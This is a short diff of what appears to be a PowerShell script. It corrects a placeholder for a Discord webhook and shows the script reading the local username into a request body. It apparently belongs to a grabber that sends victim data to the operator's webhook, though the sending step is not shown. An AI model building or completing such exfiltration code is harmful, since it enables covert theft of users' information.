@@ -3,7 +3,7 @@
 #REM Put your discord webhook link at line 6
 #REM Dont forget to delete the arrays 
 
-$webhookUri = '<Put ur discord,webhook>'
+$webhookUri = '<Put ur discord webhook>'
 $name = (Get-ChildItem Env:USERNAME).Value
 $number = 1
 $body = @{
